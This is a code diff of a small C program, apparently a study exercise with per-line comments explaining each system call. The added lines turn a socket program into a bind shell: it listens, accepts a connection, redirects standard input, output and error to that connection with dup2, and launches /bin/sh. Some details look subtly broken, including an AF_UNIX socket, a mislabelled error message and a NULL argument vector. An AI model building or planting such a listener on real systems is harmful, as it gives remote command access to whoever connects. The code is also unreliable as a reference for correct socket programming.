@@ -1,5 +1,6 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <unistd.h>
 
 int main(){
     int socketfd = socket(AF_UNIX,SOCK_STREAM,0);
@@ -27,8 +28,34 @@ int main(){
         return -1;
     }
     // see man bind.
-    // change the typee into struct pointer of sockaddr which have memory address of server_address.
+    // this systemcall used to bind address into the socket.
+    // change the type into struct pointer of sockaddr which have memory address of server_address.
     // third parameter is lenght of struct sockaddr, which is length of server_address.
     // if it return -1, its having error.
+    if (listen(socketfd,0) < 0){
+        puts("Listen process is failed!");
+        return -1;
+    }
+    // see man listen.
+    // this systemcall used to accept incoming connection.
+    // second parameter of listen is max length of queue of pending connection.
+    int acceptfd = accept(socketfd, NULL, NULL);
+    if ( acceptfd < 0){
+        puts("Listen process is failed!");
+    }
+    // see man accept.
+    // the parameter is same as listen.
+    // this systemcall used to extract first connection request on queue of pending connection for listen socket.
+    for (int i = 0; i < 3; i++)
+    {
+        dup2(acceptfd,i);
+        // see man dup2.
+        // duplicate file descriptor of accept. (Need unistd.h)
+    }
+
+    execve("/bin/sh",NULL,NULL);
+    // see man execve
+    // execute program.
+    
     return 0;
 }
